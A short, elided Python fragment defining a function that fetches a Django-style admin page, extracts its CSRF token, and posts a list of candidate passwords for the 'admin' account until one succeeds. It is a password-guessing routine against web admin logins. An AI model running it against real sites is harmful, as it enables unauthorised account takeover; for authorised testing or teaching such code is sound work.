...
def test_password(address, candidates):
	...
	x = session.get(address + '/admin/')
	token = extract_token(x)
	for password in candidates:
		r = session.post(address + '/admin/login/?next=/admin/', data={'username': 'admin', 'password': password, 'csrfmiddlewaretoken': token})
		if (isloggedin(r)):
			return password
	return None
